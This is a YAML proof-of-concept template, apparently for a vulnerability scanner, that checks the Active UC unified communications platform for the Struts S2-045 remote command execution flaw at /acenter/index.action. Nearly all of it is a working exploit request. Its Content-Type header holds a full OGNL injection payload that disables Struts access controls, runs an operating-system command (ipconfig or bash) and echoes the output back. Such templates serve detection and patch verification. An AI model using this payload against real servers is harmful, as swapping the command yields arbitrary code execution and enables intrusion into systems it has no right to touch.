app: 网动统一通信平台(Active UC)
query: title:"网动统一通信平台(Active UC)"
meta:
  name: Active UC index.action 远程命令执行漏洞
  level: 5
  tags:
    - remote_code_execution
  description: 网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令
  homepage: '-'
  author: 一曲成殇
  references: ''
  solution: '-'
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: POST
            path: /acenter/index.action
            redirect: false
            header:
              - Accept-Encoding: gzip, deflate
              - Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
              - Connection: close
              - Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36
              - Charsert: UTF-8
              - Content-Type: '%{(#nike=''multipart/form-data'').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[''com.opensymphony.xwork2.ActionContext.container'']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=''ipconfig'').(#iswin=(@java.lang.System@getProperty(''os.name'').toLowerCase().contains(''win''))).(#cmds=(#iswin?{''cmd.exe'',''/c'',#cmd}:{''/bin/bash'',''-c'',#cmd})).(#p=new
              java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())};
              boundary=---------------------------18012721719170'
              - Pragma: no-cache
            params: '-----------------------------18012721719170\nContent-Disposition:
            form-data; name=\"pocfile\"; filename=\"text.txt\"\nContent-Type: text/plain\n-----------------------------18012721719170'
          response:
            - name: body
              value: Windows IP
              type: contains
  create_at: "2021-10-15 14:54:38"
